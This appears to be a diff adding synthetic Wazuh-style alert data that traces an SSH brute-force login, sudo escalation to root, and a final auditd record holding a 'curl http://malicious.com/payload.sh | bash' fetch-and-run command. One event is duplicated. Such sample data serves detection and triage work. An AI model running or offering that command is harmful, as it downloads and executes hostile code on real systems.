@@ -1,0 +1,133 @@
+[
+  {
+    "timestamp": "2023-10-27T10:00:01Z",
+    "rule": {
+      "level": 7,
+      "description": "sshd: Failed login for user admin",
+      "groups": ["authentication", "syslog"]
+    },
+    "agent": {
+      "name": "web-prod-01",
+      "id": "001"
+    },
+    "data": {
+      "srcip": "185.20.10.1",
+      "dstip": "10.0.0.5",
+      "user": "admin",
+      "protocol": "TCP",
+      "srcport": "48992",
+      "dstport": "22",
+      "action": "failed"
+    },
+    "full_log": "Oct 27 10:00:01 web-prod-01 sshd[1234]: Failed password for admin from 185.20.10.1 port 48992 ssh2",
+    "id": "wazuh-event-001"
+  },
+  {
+    "timestamp": "2023-10-27T10:00:05Z",
+    "rule": {
+      "level": 7,
+      "description": "sshd: Failed login for user admin (brute force attempt)",
+      "groups": ["authentication", "syslog"]
+    },
+    "agent": {
+      "name": "web-prod-01",
+      "id": "001"
+    },
+    "data": {
+      "srcip": "185.20.10.1",
+      "dstip": "10.0.0.5",
+      "user": "admin",
+      "protocol": "TCP",
+      "srcport": "48995",
+      "dstport": "22",
+      "action": "failed"
+    },
+    "full_log": "Oct 27 10:00:05 web-prod-01 sshd[1235]: Failed password for admin from 185.20.10.1 port 48995 ssh2",
+    "id": "wazuh-event-002"
+  },
+  {
+    "timestamp": "2023-10-27T10:05:12Z",
+    "rule": {
+      "level": 3,
+      "description": "sshd: Successful login for user admin",
+      "groups": ["authentication", "syslog"]
+    },
+    "agent": {
+      "name": "web-prod-01",
+      "id": "001"
+    },
+    "data": {
+      "srcip": "185.20.10.1",
+      "dstip": "10.0.0.5",
+      "user": "admin",
+      "protocol": "TCP",
+      "srcport": "49001",
+      "dstport": "22",
+      "action": "success"
+    },
+    "full_log": "Oct 27 10:05:12 web-prod-01 sshd[1300]: Accepted password for admin from 185.20.10.1 port 49001 ssh2",
+    "id": "wazuh-event-003"
+  },
+  {
+    "timestamp": "2023-10-27T10:06:00Z",
+    "rule": {
+      "level": 12,
+      "description": "sudo: User admin executed command as root",
+      "groups": ["privilege_escalation", "syslog"]
+    },
+    "agent": {
+      "name": "web-prod-01",
+      "id": "001"
+    },
+    "data": {
+      "srcip": "185.20.10.1",
+      "dstip": "10.0.0.5",
+      "user": "admin",
+      "process": "sudo",
+      "action": "privilege escalation"
+    },
+    "full_log": "Oct 27 10:06:00 web-prod-01 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash",
+    "id": "wazuh-event-004"
+  },
+  {
+    "timestamp": "2023-10-27T10:06:00Z",
+    "rule": {
+      "level": 12,
+      "description": "sudo: User admin executed command as root",
+      "groups": ["privilege_escalation", "syslog"]
+    },
+    "agent": {
+      "name": "web-prod-01",
+      "id": "001"
+    },
+    "data": {
+      "srcip": "185.20.10.1",
+      "dstip": "10.0.0.5",
+      "user": "admin",
+      "process": "sudo",
+      "action": "privilege escalation"
+    },
+    "full_log": "Oct 27 10:06:00 web-prod-01 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash",
+    "id": "wazuh-event-004"
+  },
+  {
+    "timestamp": "2023-10-27T10:08:15Z",
+    "rule": {
+      "level": 10,
+      "description": "Suspicious process execution: bash",
+      "groups": ["process_execution"]
+    },
+    "agent": {
+      "name": "web-prod-01",
+      "id": "001"
+    },
+    "data": {
+      "srcip": "185.20.10.1",
+      "dstip": "10.0.0.5",
+      "user": "root",
+      "process": "bash"
+    },
+    "full_log": "Oct 27 10:08:15 web-prod-01 auditd: type=EXECVE msg=audit(1698401295.123:456): argc=3 a0=\"bash\" a1=\"-c\" a2=\"curl http://malicious.com/payload.sh | bash\"",
+    "id": "wazuh-event-005"
+  }
+]
